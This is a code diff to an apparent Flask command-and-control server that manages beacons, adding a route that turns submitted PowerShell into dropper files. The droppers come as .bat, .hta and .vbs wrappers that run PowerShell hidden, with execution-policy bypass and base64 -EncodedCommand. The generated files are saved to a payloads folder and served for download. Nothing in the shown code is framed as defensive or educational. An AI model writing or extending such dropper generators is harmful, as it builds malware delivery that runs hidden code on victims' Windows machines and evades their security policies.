@@ -1,7 +1,7 @@
 import eventlet
 eventlet.monkey_patch()
 
-from flask import send_from_directory, Flask, request, jsonify, render_template, redirect, session, url_for
+from flask import send_from_directory, Flask, request, jsonify, render_template, redirect, session, url_for, render_template, request
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
 from flask_socketio import SocketIO, emit
 import sqlite3
@@ -67,6 +67,12 @@ UPLOAD_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'p
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
+
+
+def to_base64_ps(ps_code):
+    # PowerShell expects UTF-16LE encoding for -EncodedCommand
+    ps_bytes = ps_code.encode('utf-16le')
+    return base64.b64encode(ps_bytes).decode()
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -439,6 +445,46 @@ def download_file_from_beacon(hostname):
     conn.commit()
     conn.close()
     return jsonify({"status": "queued"})
+@app.route('/generate_ps', methods=['GET', 'POST'])
+def generate_ps():
+    output_path = None
+    if request.method == 'POST':
+        ps1_code = request.form.get('ps1')
+        wrapper = request.form.get('format')
+        filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
+
+        dropper_code = ""
+        if wrapper == "bat":
+            dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps1_code.strip()}"'
+        elif wrapper == "hta":
+            # 🔥 Use BASE64 encoding for multiline payloads
+            b64 = to_base64_ps(ps1_code)
+            dropper_code = f'''<script language="VBScript">
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}"
+self.close
+</script>'''
+        elif wrapper == "vbs":
+            dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -command "{ps1_code.strip()}"", 0'''
+
+        output_dir = os.path.join("server", "static", "payloads")
+        os.makedirs(output_dir, exist_ok=True)
+        output_path = os.path.join(output_dir, filename)
+
+        with open(output_path, "w") as f:
+            f.write(dropper_code)
+
+        output_path = filename  # just the filename for the download link
+
+    return render_template("generate_ps.html", output_path=output_path)
+
+
+@app.route('/payloads/<filename>')
+def payloads_download(filename):
+    # Adjust path if needed, but this matches your structure:
+    return send_from_directory('server/static/payloads', filename, as_attachment=True)
+
 
 
 @socketio.on('connect')
